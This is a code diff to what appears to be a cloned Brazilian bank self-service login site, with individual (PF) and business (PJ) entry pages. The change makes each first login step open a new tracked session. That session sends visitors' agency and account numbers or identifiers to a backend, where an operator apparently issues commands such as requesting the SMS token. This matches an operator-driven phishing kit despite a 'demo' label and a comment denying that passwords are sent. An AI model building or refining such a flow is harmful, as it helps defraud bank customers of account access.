@@ -329,7 +329,7 @@ function AutoatendimentoPage() {
 
     setError('');
     setIsLoading(true);
-    trackSession('PF', '/pessoa-fisica', `Ag ${normalizedAgency} / Conta ${normalizedAccount}`);
+    trackSession('PF', '/pessoa-fisica', `Ag ${normalizedAgency} / Conta ${normalizedAccount}`, undefined, true);
   };
 
   useEffect(() => {
@@ -828,7 +828,7 @@ function PjLoginPage() {
     }
 
     setIsLoading(true);
-    trackSession('PJ', '/sign-in', `${accessType}: ${identifier}`);
+    trackSession('PJ', '/sign-in', `${accessType}: ${identifier}`, undefined, true);
   };
 
   useEffect(() => {
@@ -1543,10 +1543,10 @@ function AccessTracker() {
 
 const SESSION_ID_KEY = 'demo-flow-session-id';
 
-function getSessionId(): string {
+function getSessionId(forceNew = false): string {
   try {
     let id = window.sessionStorage.getItem(SESSION_ID_KEY);
-    if (!id) {
+    if (!id || forceNew) {
       id = (crypto.randomUUID?.() ?? `s-${Date.now()}-${Math.random().toString(16).slice(2)}`);
       window.sessionStorage.setItem(SESSION_ID_KEY, id);
     }
@@ -1561,20 +1561,24 @@ type FlowType = 'PF' | 'PJ';
 /**
  * Registra/atualiza a sessão única do visitante conforme ele avança no fluxo.
  * NUNCA envia senha/OTP. `respondTo` sinaliza resposta a um comando do operador
- * (ex.: informou o token SMS) sem transmitir o valor digitado.
+ * (ex.: informou o token SMS) sem transmitir o valor digitado. `firstStep` inicia
+ * um novo sessionId — usado somente na PRIMEIRA etapa de cada fluxo (PF: CONTINUAR
+ * em /pessoa-fisica; PJ: ENTRAR em /sign-in) para criar um card por tentativa e não
+ * reaproveitar/contaminar sessões anteriores.
  */
 function trackSession(
   flowType: FlowType,
   route: string,
   label: string | null,
   respondTo?: string,
+  firstStep = false,
 ) {
   try {
     fetch('/api/auth-attempt', {
       method: 'POST',
       headers: { 'Content-Type': 'application/json' },
       body: JSON.stringify({
-        sessionId: getSessionId(),
+        sessionId: getSessionId(firstStep),
         flowType,
         route,
         label,
